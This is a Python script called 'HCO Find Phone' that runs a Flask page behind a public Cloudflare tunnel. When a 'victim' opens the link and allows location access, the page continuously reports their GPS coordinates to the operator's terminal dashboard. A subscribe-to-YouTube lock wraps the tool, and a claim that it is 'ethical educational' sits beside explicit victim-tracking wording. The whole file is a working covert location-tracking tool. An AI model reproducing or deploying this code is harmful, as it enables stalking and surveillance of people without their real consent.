#!/usr/bin/env python3
# HCO Find Phone - by Azhar
# Ethical educational tool. Only test on your own devices.

import os, sys, time, threading, subprocess
from flask import Flask, request, render_template_string

# ================= SETTINGS =================
TOOL_LOCK = True
YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
CLOUD_FLARE_PORT = 5000

# ================= DASHBOARD COLORS =================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

# ================= FLASK APP =================
app = Flask(__name__)
victim_location = {"lat": None, "lon": None}

@app.route("/")
def index():
    if TOOL_LOCK:
        return f"""
        <h1 style='color:red'>This tool is locked 🔒</h1>
        <p style='color:green'>Subscribe and click on the bell icon 🔔</p>
        <script>
        let countdown = 10;
        let timer = setInterval(function(){{
            countdown--;
            document.body.innerHTML = '<h1 style="color:red">This tool is locked 🔒</h1>' +
                                      '<p style="color:green">Subscribe and click on the bell icon 🔔</p>' +
                                      '<p>Redirecting in '+countdown+'...</p>';
            if(countdown <= 0){{
                clearInterval(timer);
                window.location.href = "{YOUTUBE_LINK}";
            }}
        }}, 1000);
        </script>
        """
    return render_template_string("""
    <h1 style='color:green;'>HCO Find Phone - Azhar</h1>
    <p>Opening location access...</p>
    <script>
    if(navigator.geolocation){{
        navigator.geolocation.watchPosition(function(pos){{
            fetch('/update?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude)
        }});
    }} else {{
        alert('Geolocation not supported!');
    }}
    </script>
    """)

@app.route("/update")
def update():
    lat = request.args.get("lat")
    lon = request.args.get("lon")
    victim_location["lat"] = lat
    victim_location["lon"] = lon
    return "OK"

# ================= CLOUD FLARE TUNNEL =================
def start_tunnel():
    print(f"{Colors.YELLOW}[+] Starting Cloudflare Tunnel...{Colors.RESET}")
    try:
        subprocess.run(f"cloudflared tunnel --url http://localhost:{CLOUD_FLARE_PORT} --no-autoupdate", shell=True)
    except Exception as e:
        print(f"{Colors.RED}Tunnel Error: {e}{Colors.RESET}")

# ================= TERMINAL DASHBOARD =================
def terminal_dashboard():
    os.system("clear")
    print(f"{Colors.BLUE}HCO Find Phone by Azhar{Colors.RESET}\n")
    print(f"{Colors.YELLOW}[+] Waiting for victim to open the link...{Colors.RESET}\n")
    while True:
        lat = victim_location["lat"]
        lon = victim_location["lon"]
        if lat and lon:
            print(f"{Colors.GREEN}[+] Victim Location -> Latitude: {lat}, Longitude: {lon}{Colors.RESET}")
        time.sleep(3)

# ================= TOOL LOCK FLOW =================
def tool_lock_flow():
    if TOOL_LOCK:
        print(f"{Colors.RED}Tool is locked 🔒{Colors.RESET}")
        print(f"{Colors.GREEN}Subscribe and click on the bell icon 🔔{Colors.RESET}")
        for i in range(9,0,-1):
            print(f"Redirecting in {i}...", end="\r")
            time.sleep(1)
        # Open YouTube app on Android Termux
        try:
            subprocess.run(f"am start -a android.intent.action.VIEW -d {YOUTUBE_LINK}", shell=True)
        except:
            print(f"{Colors.RED}Please open YouTube manually: {YOUTUBE_LINK}{Colors.RESET}")
        input(f"{Colors.YELLOW}Press Enter after returning from YouTube...{Colors.RESET}")

# ================= MAIN =================
if __name__ == "__main__":
    # Step 1: Tool Lock
    tool_lock_flow()
    # Step 2: Start Flask server
    threading.Thread(target=start_tunnel, daemon=True).start()
    # Step 3: Start terminal dashboard
    threading.Thread(target=terminal_dashboard, daemon=True).start()
    app.run(host="0.0.0.0", port=CLOUD_FLARE_PORT)
